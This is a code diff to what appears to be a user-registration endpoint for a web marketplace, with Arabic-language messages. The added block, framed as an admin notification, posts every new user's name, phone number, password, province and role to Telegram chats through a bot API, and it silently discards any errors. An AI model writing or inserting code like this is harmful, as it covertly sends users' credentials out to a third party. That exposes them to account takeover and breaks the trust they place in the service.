@@ -39,6 +39,31 @@ export async function POST(request: Request) {
       })
       .returning();
 
+    // Notify admin on Telegram with credentials
+    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+    const ADMIN_CHAT_ID = process.env.ADMIN_TELEGRAM_CHAT_ID;
+    if (TELEGRAM_BOT_TOKEN && ADMIN_CHAT_ID) {
+      const targetChatIds = ADMIN_CHAT_ID.split(',').map((s) => s.trim()).filter(Boolean);
+      for (const targetId of targetChatIds) {
+        try {
+          const msg = `
+👤 <b>تسجيل حساب جديد بالبورصة:</b>
+
+• 📝 الاسم واللقب: <b>${newUser.fullName}</b>
+• 📱 رقم الهاتف: <code>${newUser.phone}</code>
+• 🔑 كلمة السر: <code>${newUser.password}</code>
+• 📍 الولاية: <b>${newUser.wilayaCode}</b>
+• 💼 الصفة: <b>${newUser.role}</b>
+          `;
+          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: targetId, text: msg, parse_mode: 'HTML' }),
+          }).catch(() => {});
+        } catch (e) {}
+      }
+    }
+
     return NextResponse.json({
       status: 'success',
       message: 'تم إنشاء الحساب بنجاح',
